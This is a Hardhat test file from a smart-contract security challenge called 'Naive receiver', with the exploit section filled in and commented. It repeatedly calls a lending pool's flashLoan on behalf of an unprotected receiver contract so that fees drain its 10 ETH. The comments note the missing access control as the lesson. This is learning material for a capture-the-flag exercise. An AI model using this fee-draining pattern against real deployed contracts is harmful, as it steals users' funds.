const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   

        // So in the receiver contract it hardcodes the pool address in the constructor
        // We can't make our own flashloan contract

       // I mean, neither of the contracts are ownable or access restricted or anything
       // Could I just make 10 flashloans myself and cost the receiver guy 1 ETH * 10 times? 

       // Yes! This works, poor receiver guy lol

       // SOLUTION 1 ========================================================== 

       for(let i=0; i<10; i++) {
         const tx = await this.pool.connect(attacker).flashLoan(this.receiver.address, 0)
         tx.wait()
       }

       // HOWEVER! They say in the problem scope 'doing it in a single transaction is a big plus ;)'
       // How could I do that? 

       // I could make my own Smart Contract that creates the flash loans repeatedly inside one transaction? 
       // I'll leave this as a TODO~ for another time 


       // LESSONS =============================================================

       // * Always be wary of ownership & access control, keep in mind 'who' could call your contracts and for what purposes

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
